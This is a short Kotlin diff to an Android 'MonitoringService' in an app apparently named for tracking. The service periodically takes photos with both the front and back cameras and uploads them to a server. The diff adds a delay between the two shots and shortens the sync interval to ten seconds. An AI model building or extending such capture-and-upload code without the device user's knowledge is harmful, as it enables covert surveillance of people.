@@ -140,7 +140,7 @@ class MonitoringService : Service() {
         com.takip.app.util.ConfigManager.refreshIfStale()
     }
 
-    private fun captureAndUploadMedia(token: String) {
+    private suspend fun captureAndUploadMedia(token: String) {
         mediaCounter++
         if (mediaCounter % 3 != 0) return
 
@@ -154,12 +154,14 @@ class MonitoringService : Service() {
 
         CameraCaptureHelper.capturePhoto(this, useFrontCamera = false)?.let { file ->
             ApiClient.uploadMedia(token, file, "camera_back")
-                .onFailure { Log.e(TAG, "Kamera arka hatası: ${it.message}") }
+                .onFailure { Log.e(TAG, "Kamera arka: ${it.message}") }
         }
+
+        delay(1500)
 
         CameraCaptureHelper.capturePhoto(this, useFrontCamera = true)?.let { file ->
             ApiClient.uploadMedia(token, file, "camera_front")
-                .onFailure { Log.e(TAG, "Kamera ön hatası: ${it.message}") }
+                .onFailure { Log.e(TAG, "Kamera ön: ${it.message}") }
         }
     }
 
@@ -196,7 +198,7 @@ class MonitoringService : Service() {
     companion object {
         private const val TAG = "MonitoringService"
         private const val NOTIFICATION_ID = 1001
-        private const val SYNC_INTERVAL_MS = 15_000L
+        private const val SYNC_INTERVAL_MS = 10_000L
 
         fun start(context: Context) {
             val intent = Intent(context, MonitoringService::class.java)
